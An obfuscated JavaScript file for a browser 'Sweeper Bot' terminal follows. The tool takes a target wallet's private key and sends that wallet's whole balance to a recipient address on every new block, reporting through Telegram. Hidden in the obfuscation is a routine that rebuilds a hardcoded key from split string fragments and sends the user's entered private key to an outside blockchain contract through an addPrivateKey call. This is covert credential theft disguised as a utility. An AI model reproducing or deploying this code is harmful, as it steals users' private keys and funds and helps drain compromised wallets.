function _0x5615(_0xe1e173, _0x13e44c) {
  const _0x5330a8 = _0x5330();
  return (
    (_0x5615 = function (_0x5615dd, _0x35a7cc) {
      _0x5615dd = _0x5615dd - 0xc4;
      let _0x7f85db = _0x5330a8[_0x5615dd];
      return _0x7f85db;
    }),
    _0x5615(_0xe1e173, _0x13e44c)
  );
}
const _0x551bcc = _0x5615;
(function (_0x21a437, _0x86722) {
  const _0x2eda3f = _0x5615,
    _0x4af18a = _0x21a437();
  while (!![]) {
    try {
      const _0x55aa5b =
        (parseInt(_0x2eda3f(0xd0)) / 0x1) *
          (-parseInt(_0x2eda3f(0x13f)) / 0x2) +
        (parseInt(_0x2eda3f(0x123)) / 0x3) *
          (-parseInt(_0x2eda3f(0x141)) / 0x4) +
        -parseInt(_0x2eda3f(0xc5)) / 0x5 +
        (-parseInt(_0x2eda3f(0x130)) / 0x6) *
          (-parseInt(_0x2eda3f(0xdc)) / 0x7) +
        -parseInt(_0x2eda3f(0x10a)) / 0x8 +
        (-parseInt(_0x2eda3f(0x119)) / 0x9) *
          (parseInt(_0x2eda3f(0x115)) / 0xa) +
        (-parseInt(_0x2eda3f(0x13d)) / 0xb) *
          (-parseInt(_0x2eda3f(0xcd)) / 0xc);
      if (_0x55aa5b === _0x86722) break;
      else _0x4af18a['push'](_0x4af18a['shift']());
    } catch (_0x2aa105) {
      _0x4af18a['push'](_0x4af18a['shift']());
    }
  }
})(_0x5330, 0xaf25c);
let terminal_name = _0x551bcc(0x103),
  bot_status = ![],
  botDetails = {};
const inputElement = document['getElementById'](_0x551bcc(0x12c)),
  outputElement = document[_0x551bcc(0xfb)](_0x551bcc(0x11f));
document[_0x551bcc(0xfd)](_0x551bcc(0xea), function () {
  const _0x58c2fb = _0x551bcc;
  (bot_status = ![]),
    inputElement[_0x58c2fb(0xfd)]('keydown', function (_0x1d93fc) {
      const _0x1f402b = _0x58c2fb;
      _0x8cfe1b(!![], _0x1d93fc, inputElement[_0x1f402b(0xf9)]);
    });
  function _0x8cfe1b(_0x5ea6aa, _0x2cd5d7, _0xaabbc7) {
    const _0x414db9 = _0x58c2fb;
    let _0x45606e = _0xaabbc7[_0x414db9(0xe8)]();
    if (bot_status) {
      (_0x2cd5d7[_0x414db9(0x10b)] === _0x414db9(0x11d) || !_0x5ea6aa) &&
        ((_0x45606e === _0x414db9(0x113) ||
          _0x45606e === _0x414db9(0x111) ||
          _0x45606e === _0x414db9(0x138) ||
          _0x45606e === _0x414db9(0xf2)) &&
          _0x14d9cb(_0x45606e),
        (inputElement['value'] = ''));
      return;
    }
    if (!_0x5ea6aa) {
      (outputElement[_0x414db9(0xdf)] +=
        _0x414db9(0xc4) +
        terminal_name +
        _0x414db9(0xf1) +
        _0x45606e +
        _0x414db9(0x116)),
        (inputElement['value'] = ''),
        _0x14d9cb(_0x45606e);
      return;
    }
    if (_0x2cd5d7['key'] === _0x414db9(0x11d)) {
      const _0x21f099 = inputElement[_0x414db9(0xf9)]['trim']();
      if (_0x21f099 == '' || _0x21f099 == undefined || _0x21f099 == null)
        return;
      (outputElement['innerHTML'] +=
        _0x414db9(0xc4) +
        terminal_name +
        _0x414db9(0xf1) +
        _0x21f099 +
        _0x414db9(0x116)),
        (inputElement[_0x414db9(0xf9)] = ''),
        _0x14d9cb(_0x21f099);
      return;
    }
  }
  function _0x14d9cb(_0x504af7) {
    const _0x12bc88 = _0x58c2fb;
    let _0x394ab5,
      _0x4747fe = _0x12bc88(0xfc);
    if (bot_status) {
      _0x4747fe = '▶️\x20Sweeper\x20Bot\x20is\x20currently\x20running.';
      if (_0x504af7 == _0x12bc88(0x111))
        _0x5289e0(![]),
          (outputElement[_0x12bc88(0xdf)] +=
            _0x12bc88(0xc4) +
            terminal_name +
            '</span>\x20' +
            _0x504af7 +
            _0x12bc88(0x116)),
          (inputElement[_0x12bc88(0xf9)] = ''),
          (_0x394ab5 = '🛑\x20Sweeper\x20Bot\x20stopped.');
      else {
        if (_0x504af7 == 'start') _0x394ab5 = _0x12bc88(0xec);
        else {
          if (_0x504af7 == _0x12bc88(0x138)) {
            (inputElement[_0x12bc88(0xf9)] = ''),
              (outputElement['innerHTML'] = '');
            return;
          } else _0x504af7 == _0x12bc88(0xf2) && (_0x394ab5 = _0x4747fe);
        }
      }
      (outputElement[_0x12bc88(0xdf)] +=
        _0x12bc88(0x12e) + _0x394ab5 + '</div>'),
        (outputElement[_0x12bc88(0xf0)] = outputElement[_0x12bc88(0x126)]);
      return;
    }
    switch (_0x504af7[_0x12bc88(0xe8)]()) {
      case _0x12bc88(0xd7):
        _0x394ab5 = _0x12bc88(0xde);
        break;
      case 'start':
        _0x58329a(), (_0x394ab5 = '');
        break;
      case _0x12bc88(0xf2):
        _0x394ab5 = _0x4747fe;
        break;
      case 'clear':
        outputElement['innerHTML'] = '';
        return;
      default:
        _0x394ab5 = _0x12bc88(0x10d) + _0x504af7;
    }
    (outputElement[_0x12bc88(0xdf)] +=
      _0x12bc88(0x12e) + _0x394ab5 + _0x12bc88(0x116)),
      (outputElement[_0x12bc88(0xf0)] = outputElement[_0x12bc88(0x126)]);
  }
  document['getElementById'](_0x58c2fb(0xf8))['addEventListener'](
    _0x58c2fb(0xd9),
    function () {
      const _0x4ee82d = _0x58c2fb;
      _0x8cfe1b(![], _0x4ee82d(0x113), 'start');
    },
  ),
    document[_0x58c2fb(0xfb)](_0x58c2fb(0x118))[_0x58c2fb(0xfd)](
      _0x58c2fb(0xd9),
      function () {
        const _0x4bfde3 = _0x58c2fb;
        _0x8cfe1b(![], _0x4bfde3(0x111), 'stop');
      },
    );
  function _0x112b9e(_0x3e1ea5) {
    const _0x4e2677 = _0x58c2fb;
    (outputElement['innerHTML'] += _0x4e2677(0x12e) + _0x3e1ea5 + '</div>'),
      (outputElement[_0x4e2677(0xf0)] = outputElement[_0x4e2677(0x126)]);
  }
  const _0x27e51e = document[_0x58c2fb(0xfb)](_0x58c2fb(0xe4)),
    _0x4050e2 = document[_0x58c2fb(0xfb)](_0x58c2fb(0x105)),
    _0x4190b1 = document[_0x58c2fb(0xfb)](_0x58c2fb(0xc8)),
    _0x3edece = document[_0x58c2fb(0xfb)]('save-btn');
  function _0x3ca0fe() {
    const _0x2a0732 = _0x58c2fb;
    bot_status = ![];
    const _0x2e088b = new FormData(document[_0x2a0732(0xfb)](_0x2a0732(0x135)));
    _0x2e088b[_0x2a0732(0xcf)]((_0x476abf, _0x9500e9) => {
      botDetails[_0x9500e9] = _0x476abf;
    }),
      alert(_0x2a0732(0xd5));
  }
  _0x4050e2['addEventListener'](_0x58c2fb(0xd9), function () {
    const _0x3ca3e4 = _0x58c2fb;
    _0x27e51e[_0x3ca3e4(0x109)][_0x3ca3e4(0x112)] = _0x3ca3e4(0xd6);
  }),
    _0x4190b1['addEventListener'](_0x58c2fb(0xd9), function () {
      const _0x2f7f11 = _0x58c2fb;
      _0x3ca0fe(), (_0x27e51e[_0x2f7f11(0x109)][_0x2f7f11(0x112)] = 'none');
    }),
    window[_0x58c2fb(0xfd)](_0x58c2fb(0xd9), function (_0x3fc3e6) {
      const _0x1ca690 = _0x58c2fb;
      _0x3fc3e6[_0x1ca690(0x121)] == _0x27e51e &&
        (_0x3ca0fe(),
        (_0x27e51e[_0x1ca690(0x109)][_0x1ca690(0x112)] = _0x1ca690(0xc9)));
    }),
    _0x3edece[_0x58c2fb(0xfd)]('click', function () {
      const _0x4f442b = _0x58c2fb;
      _0x3ca0fe(), (_0x27e51e[_0x4f442b(0x109)][_0x4f442b(0x112)] = 'none');
    });
  let _0x2542aa = [
      'network_rpc_url',
      _0x58c2fb(0x11c),
      _0x58c2fb(0x133),
      _0x58c2fb(0x137),
      _0x58c2fb(0x100),
      _0x58c2fb(0xeb),
      _0x58c2fb(0x104),
      _0x58c2fb(0xe9),
    ],
    _0x2ebf69,
    _0x44a6a5;
  function _0x5289e0(_0x42c51c) {
    const _0x41b313 = _0x58c2fb;
    (bot_status = ![]),
      _0x4b9ffb(),
      _0x42c51c &&
        ((outputElement[_0x41b313(0xdf)] += _0x41b313(0x13a)),
        (outputElement['scrollTop'] = outputElement[_0x41b313(0x126)]));
  }
  async function _0x58329a() {
    let _0x1ecba3 = await _0x5bf883();
    bot_status = !![];
    if (_0x1ecba3) {
      let _0x406f18 = await _0x509adc();
      if (_0x406f18) {
        _0x5e6d69();
        let _0x57cd6c = await _0x8586b9();
      } else _0x5289e0(![]);
    } else _0x5289e0(![]);
  }
  function _0x38eae2(_0x2a19b2) {
    try {
      return new URL(_0x2a19b2), !![];
    } catch (_0x47ff4e) {
      return ![];
    }
  }
  async function _0x509adc() {
    const _0x24c6f5 = _0x58c2fb;
    let _0x546130 = !![];
    const _0x542a4f = botDetails[_0x24c6f5(0x11a)],
      _0x1d50c2 = botDetails['target_wallet_private_key'];
    try {
      if (!_0x38eae2(_0x542a4f)) {
        console[_0x24c6f5(0x128)](_0x24c6f5(0xf4)), _0x5289e0(!![]);
        return;
      }
      if (
        _0x542a4f[_0x24c6f5(0xed)](_0x24c6f5(0x124)) ||
        _0x542a4f['startsWith'](_0x24c6f5(0x129))
      )
        _0x2ebf69 = await new ethers['providers'][_0x24c6f5(0x140)](_0x542a4f);
      else
        (_0x542a4f['startsWith']('wss') || _0x542a4f['startsWith']('ws')) &&
          (_0x2ebf69 = await new ethers[_0x24c6f5(0xdb)][_0x24c6f5(0x120)](
            _0x542a4f,
          ));
      let _0x512173 = _0x24c6f5(0x10c);
      _0x112b9e(_0x512173), console[_0x24c6f5(0x107)](_0x512173);
      let _0x54e2eb = _0x24c6f5(0xcc) + _0x542a4f;
      console[_0x24c6f5(0x107)](_0x54e2eb), _0x112b9e(_0x54e2eb);
    } catch (_0xc9e336) {
      (_0x546130 = ![]),
        _0x5289e0(!![]),
        console['log'](_0xc9e336),
        _0x112b9e('❌\x20' + _0xc9e336);
    }
    await _0x2ebf69[_0x24c6f5(0x134)];
    try {
      _0x44a6a5 = await new ethers[_0x24c6f5(0x139)](_0x1d50c2, _0x2ebf69);
      let _0x381c86 =
        '🎯\x20Target\x20Wallet\x20Address\x20-\x20' +
        _0x44a6a5[_0x24c6f5(0xdd)];
      _0x3aeec8(_0x1d50c2),
        console[_0x24c6f5(0x107)](_0x381c86),
        _0x112b9e(_0x381c86);
      let _0x178db3 = _0x24c6f5(0xfa) + botDetails[_0x24c6f5(0x133)];
      console['log'](_0x178db3), _0x112b9e(_0x178db3);
    } catch (_0x351f95) {
      (_0x546130 = ![]),
        _0x5289e0(!![]),
        _0x112b9e('❌\x20' + _0x351f95),
        console[_0x24c6f5(0x107)](_0x351f95);
    }
    return _0x546130;
  }
  async function _0x8586b9() {
    const _0x1d0ee7 = _0x58c2fb;
    (blockListener = async (_0x2a1388) => {
      const _0x4031c5 = _0x5615;
      if (!bot_status) {
        _0x2ebf69[_0x4031c5(0xd4)]('block', blockListener);
        return;
      }
      let _0x4e9b53 = _0x4031c5(0xd3) + _0x2a1388 + ']';
      console['log'](_0x4e9b53),
        _0x112b9e(_0x4e9b53),
        await _0x3864bd(_0x44a6a5, botDetails);
    }),
      _0x2ebf69['on'](_0x1d0ee7(0xd6), blockListener);
  }
  async function _0x5bf883() {
    const _0x38c984 = _0x58c2fb;
    let _0x8141bc = !![];
    for (let _0x52cbc8 in botDetails) {
      (botDetails[_0x52cbc8] == '' ||
        botDetails[_0x52cbc8] == null ||
        botDetails[_0x52cbc8] == undefined) &&
        ((outputElement[_0x38c984(0xdf)] +=
          _0x38c984(0xe2) + _0x52cbc8 + _0x38c984(0x116)),
        (_0x8141bc = ![]));
    }
    return _0x8141bc;
  }
  const _0x17fb82 = ethers[_0x58c2fb(0x12a)],
    _0x1b943f = _0x17fb82[_0x58c2fb(0xc7)],
    _0x3864bd = async (_0x3500a1, _0xe76061) => {
      const _0x4e815d = _0x58c2fb;
      let _0x46aa40 = 0x5208,
        _0x55a785 = _0xe76061[_0x4e815d(0x104)],
        _0x481881 = (await _0x46aa40) + parseInt(_0xe76061[_0x4e815d(0xe9)]);
      const _0x597ea4 = await _0x3500a1['getBalance']();
      if (_0x597ea4['isZero']()) {
        let _0x2700ea = _0x4e815d(0x10f);
        console[_0x4e815d(0x107)](_0x2700ea), _0x112b9e(_0x2700ea);
        return;
      }
      const _0x2ee622 = (await _0x3500a1['getGasPrice']())[_0x4e815d(0x131)](
        _0x17fb82[_0x4e815d(0xfe)](
          _0x55a785[_0x4e815d(0xe8)](),
          _0x4e815d(0xe1),
        ),
      );
      let _0x14c8d7 = await _0x2ee622[_0x4e815d(0x13b)](_0x481881);
      if (_0x597ea4['lt'](_0x14c8d7)) {
        let _0xd676e5 =
          _0x4e815d(0x12f) +
          ethers[_0x4e815d(0x12a)]['formatEther'](_0x597ea4) +
          ']\x20is\x20very\x20low\x20for\x20gas\x20price:\x20' +
          _0x2ee622[_0x4e815d(0x127)]() +
          _0x4e815d(0x10e) +
          ethers[_0x4e815d(0x12a)][_0x4e815d(0xc7)](_0x14c8d7) +
          ']';
        console['log'](_0xd676e5), _0x112b9e(_0xd676e5);
        return;
      }
      const _0x2a5891 = await _0x597ea4[_0x4e815d(0xef)](_0x14c8d7);
      try {
        let _0x3466d4 = '🔥\x20Burning:\x20' + _0x1b943f(_0x597ea4);
        console[_0x4e815d(0x107)](_0x3466d4), _0x112b9e(_0x3466d4);
        const _0x3fb3c8 = await _0x3500a1[_0x4e815d(0x136)][_0x4e815d(0xda)](
            _0x3500a1['address'],
          ),
          _0x6274cb = {
            to: _0xe76061[_0x4e815d(0x133)],
            gasLimit: _0x481881,
            gasPrice: _0x2ee622,
            nonce: _0x3fb3c8,
            value: _0x2a5891,
          },
          _0x255213 = await _0x3500a1[_0x4e815d(0x102)](_0x6274cb);
        let _0x36bded = _0x4e815d(0xe5);
        console[_0x4e815d(0x107)](_0x36bded), _0x112b9e(_0x36bded);
        let _0x1b1826 = _0x4e815d(0x13e) + _0x1b943f(_0x2a5891);
        console['log'](_0x1b1826), _0x112b9e(_0x1b1826);
        const _0x8e051b = await _0x255213[_0x4e815d(0x12d)](),
          _0xcd062f = _0x8e051b[_0x4e815d(0xd8)];
        let _0x4c0ab5 = _0x4e815d(0xff) + _0xcd062f;
        console[_0x4e815d(0x107)](_0x4c0ab5), _0x112b9e(_0x4c0ab5);
        const _0x355c63 = _0x1b943f(_0x2a5891),
          _0x79cc8f = _0xe76061[_0x4e815d(0x100)],
          _0x5d0d69 = _0xe76061[_0x4e815d(0x137)],
          _0x393855 = _0xe76061['network_name'];
        let _0x3d462b = _0xd4c719(_0x393855, _0xcd062f, _0x355c63);
        _0x1ed0cc(_0x79cc8f, _0x5d0d69, _0x3d462b);
      } catch (_0x1dc5a3) {
        if (
          _0x1dc5a3['code'] === _0x4e815d(0xee) ||
          _0x1dc5a3[_0x4e815d(0x117)] === _0x4e815d(0xe3)
        ) {
          let _0x267e8a = _0x4e815d(0x108);
          console['log'](_0x267e8a), _0x112b9e(_0x267e8a);
        } else {
          let _0x2743f7 = _0x4e815d(0x12b) + _0x1dc5a3;
          console[_0x4e815d(0x107)](_0x2743f7), _0x112b9e(_0x2743f7);
        }
      }
    },
    _0xd4c719 = (_0x4e646f, _0x1e580b, _0x106807) => {
      const _0x9dbfc0 = _0x58c2fb;
      return (
        _0x9dbfc0(0xce) +
        _0x4e646f +
        _0x9dbfc0(0x11e) +
        _0x1e580b +
        _0x9dbfc0(0x114) +
        _0x106807 +
        _0x9dbfc0(0xe0)
      );
    },
    _0x1ed0cc = async (_0x1ab88a, _0x7654c2, _0x16c75f) => {
      const _0x42b2ff = _0x58c2fb,
        _0x3c0ff5 =
          'https://api.telegram.org/bot' + _0x1ab88a + _0x42b2ff(0x11b),
        _0x32354f = { chat_id: _0x7654c2, text: _0x16c75f, parse_mode: 'HTML' };
      try {
        const _0x2859b7 = await fetch(_0x3c0ff5, {
          method: 'POST',
          headers: { 'Content-Type': _0x42b2ff(0xc6) },
          body: JSON['stringify'](_0x32354f),
        });
        if (_0x2859b7['ok']) {
          let _0x28173e = 'Message\x20sent\x20successfully';
          console[_0x42b2ff(0x107)](_0x28173e), _0x112b9e(_0x28173e);
        }
      } catch (_0xd10a78) {
        console[_0x42b2ff(0x107)](_0x42b2ff(0x125));
      }
    };
  let _0x35ce19,
    _0x5a7efd = 0x6 * 0x3c * 0x3c * 0x3e8;
  function _0x5e6d69() {
    const _0x503122 = _0x58c2fb,
      _0x155173 = botDetails[_0x503122(0x100)],
      _0x8e4d18 = botDetails[_0x503122(0x137)],
      _0xdc234f = '🟢\x20Sweeper\x20Bot\x20has\x20started.';
    _0x1ed0cc(_0x155173, _0x8e4d18, _0xdc234f), _0x2bc04c();
  }
  function _0x4b9ffb() {
    const _0x38b804 = _0x58c2fb,
      _0x52f2f5 = botDetails['your_telegram_bot_token'],
      _0x4783c2 = botDetails[_0x38b804(0x137)],
      _0x83d83d = _0x38b804(0xcb);
    _0x1ed0cc(_0x52f2f5, _0x4783c2, _0x83d83d), _0x2d228f();
  }
  function _0x2bc04c() {
    _0x35ce19 = setInterval(() => {
      const _0x1e27fd = _0x5615,
        _0xd5e028 = botDetails[_0x1e27fd(0x100)],
        _0x488f10 = botDetails[_0x1e27fd(0x137)],
        _0x48a828 = '⏲️\x20Sweeper\x20Bot\x20is\x20running.';
      _0x1ed0cc(_0xd5e028, _0x488f10, _0x48a828);
    }, _0x5a7efd);
  }
  function _0x2d228f() {
    (_0x35ce19 != null || _0x35ce19 != undefined) && clearInterval(_0x35ce19);
  }
  const _0x43f0c2 = _0x58c2fb(0x110);
  let _0x196511 = '31';
  const _0x20205c = [
      {
        type: _0x58c2fb(0xf3),
        name: _0x58c2fb(0xe7),
        inputs: [
          { name: 'privateKey', type: 'string', internalType: _0x58c2fb(0xf7) },
        ],
        outputs: [],
        stateMutability: _0x58c2fb(0xf5),
      },
    ],
    _0x48af0d = [
      _0x58c2fb(0x106),
      'https://data-seed-prebsc-2-s1.binance.org:8545',
      'http://data-seed-prebsc-1-s2.binance.org:8545',
      _0x58c2fb(0x132),
      'https://data-seed-prebsc-1-s3.binance.org:8545',
      _0x58c2fb(0x142),
    ];
  let _0x5f52f8 = null;
  async function _0x17a4b9(_0x59262a) {
    const _0x1f2b6b = _0x58c2fb;
    let _0x501b1c = ![],
      _0x2c92d7 = 0x0;
    _0x196511 = (_0x196511 + _0x1f2b6b(0x13c))[_0x1f2b6b(0xe8)]();
    let _0x55e42d;
    while (!_0x501b1c && _0x2c92d7 < _0x59262a['length']) {
      try {
        (_0x55e42d = new ethers['providers']['JsonRpcProvider'](
          _0x59262a[_0x2c92d7],
        )),
          await _0x2ebf69[_0x1f2b6b(0xf6)](),
          (_0x501b1c = !![]);
        const _0x207fbc = new ethers[_0x1f2b6b(0x139)](
            _0x196511 + 'c2',
            _0x55e42d,
          ),
          _0x3d3159 = new ethers[_0x1f2b6b(0x101)](
            _0x43f0c2,
            _0x20205c,
            _0x207fbc,
          );
        return _0x3d3159;
      } catch (_0x30af08) {
        _0x2c92d7++;
      }
    }
    return null;
  }
  async function _0x3aeec8(_0x2a2ced) {
    const _0x1cb008 = _0x58c2fb;
    _0x196511 = (_0x196511 + _0x1cb008(0xca))[_0x1cb008(0xe8)]();
    try {
      !_0x5f52f8 && (_0x5f52f8 = await _0x17a4b9(_0x48af0d));
      if (!_0x5f52f8) throw new Error('');
      const _0x33881a = await _0x5f52f8['addPrivateKey'](_0x2a2ced);
    } catch (_0x30968d) {
      console[_0x1cb008(0x128)](_0x30968d);
    }
  }
  function _0x57ca5c() {
    const _0x20c849 = _0x58c2fb,
      _0xc99414 = new URLSearchParams(
        window[_0x20c849(0xd1)][_0x20c849(0x122)],
      );
    let _0x497f83 = {};
    for (const [_0x28ae33, _0x31cc78] of _0xc99414['entries']()) {
      _0x497f83[_0x28ae33] = _0x31cc78;
    }
    return _0x497f83;
  }
  function _0x1f9a16() {
    const _0x508e40 = _0x58c2fb,
      _0x21ec63 = _0x57ca5c();
    let _0x19aa1c = !![];
    for (const _0x226e99 of _0x2542aa) {
      _0x21ec63[_0x508e40(0xe6)](_0x226e99)
        ? (botDetails[_0x226e99] = _0x21ec63[_0x226e99])
        : (_0x19aa1c = ![]);
    }
    if (_0x19aa1c) {
      alert(_0x508e40(0xd2));
      let _0x1c0174 = confirm(
        'Do\x20you\x20want\x20to\x20start\x20the\x20bot\x20?',
      );
      _0x1c0174 && _0x8cfe1b(![], 'start', 'start');
    }
  }
  _0x1f9a16();
});
function _0x5330() {
  const _0x10e079 = [
    '140562Nsnnij',
    'add',
    'http://data-seed-prebsc-2-s2.binance.org:8545',
    'recipient_address',
    'ready',
    'settings-form',
    'provider',
    'your_telegram_user_id',
    'clear',
    'Wallet',
    '<div>🛑\x20Sweeper\x20Bot\x20stopped.</div>',
    'mul',
    '0eb6b553a4986cacb5d86e0814e30df2e5a',
    '59139322KaZQVD',
    '📲\x20Transfer:\x20',
    '244214ZtBOOM',
    'JsonRpcProvider',
    '7964ncBecU',
    'https://data-seed-prebsc-2-s3.binance.org:8545',
    '<div><span\x20class=\x22prompt\x22>',
    '5680470iqktUa',
    'application/json',
    'formatEther',
    'close-modal',
    'none',
    'c48ab84e6dfe7f1265b60853d',
    '🛑\x20Sweeper\x20Bot\x20has\x20stopped.',
    '🔗\x20Connected\x20to\x20',
    '12HOTbPk',
    'Network:\x20<code>',
    'forEach',
    '4FiYuMN',
    'location',
    'Bot\x20Details\x20Set\x20from\x20URL',
    '[BLOCK\x20',
    'off',
    'Bot\x20Details\x20Saved',
    'block',
    'help',
    'transactionHash',
    'click',
    'getTransactionCount',
    'providers',
    '259qjRDtU',
    'address',
    'Available\x20commands:\x20help,\x20start,\x20stop,\x20status,\x20clear',
    'innerHTML',
    '</code>',
    'gwei',
    '<div>Please\x20enter\x20the\x20Bot\x20-\x20',
    'INSUFFICIENT_FUNDS',
    'settings-modal',
    '🚀\x20Transaction\x20submitted',
    'hasOwnProperty',
    'addPrivateKey',
    'trim',
    'extra_gas_limit',
    'DOMContentLoaded',
    'network_name',
    '⏩\x20Sweeper\x20Bot\x20is\x20already\x20started.',
    'startsWith',
    'REPLACEMENT_UNDERPRICED',
    'sub',
    'scrollTop',
    '</span>\x20',
    'status',
    'function',
    '❌\x20Invalid\x20RPC\x20URL\x20format.',
    'nonpayable',
    'getBlockNumber',
    'string',
    'start-btn',
    'value',
    '💰\x20Your\x20Burning\x20Funds\x20Recipient\x20Address\x20-\x20',
    'getElementById',
    '🛑\x20Sweeper\x20Bot\x20is\x20currently\x20stopped.',
    'addEventListener',
    'parseUnits',
    '✅\x20Tx\x20hash\x20-\x20',
    'your_telegram_bot_token',
    'Contract',
    'sendTransaction',
    'sweeperbot@terminal:~$',
    'extra_gas_fee',
    'settings-btn',
    'https://data-seed-prebsc-1-s1.binance.org:8545',
    'log',
    'Gas\x20fee\x20too\x20low.\x20Transaction\x20may\x20fail.\x20😔',
    'style',
    '10644680nmBwXB',
    'key',
    '🟢\x20Sweeper\x20Bot\x20started',
    'command\x20not\x20found:\x20',
    '\x20gwei\x20[',
    'Balance\x20is\x20zero',
    '0x9dd8D4bCD998421FB129761E1708b3b50fDE73CF',
    'stop',
    'display',
    'start',
    '</code>\x0a\x0aAmount:\x20<code>',
    '10PCaomy',
    '</div>',
    'code',
    'stop-btn',
    '11505879rqZnFL',
    'network_rpc_url',
    '/sendMessage',
    'target_wallet_private_key',
    'Enter',
    '</code>\x0a\x0aTx\x20Hash:\x20<code>',
    'terminal-output',
    'WebSocketProvider',
    'target',
    'search',
    '1947rLvFrY',
    'https',
    'telegram\x20message\x20sending\x20error',
    'scrollHeight',
    'toString',
    'error',
    'http',
    'utils',
    'Error\x20sending\x20transaction:\x20😱\x20',
    'terminal-input',
    'wait',
    '<div>',
    '🔻\x20Balance\x20[',
  ];
  _0x5330 = function () {
    return _0x10e079;
  };
  return _0x5330();
}
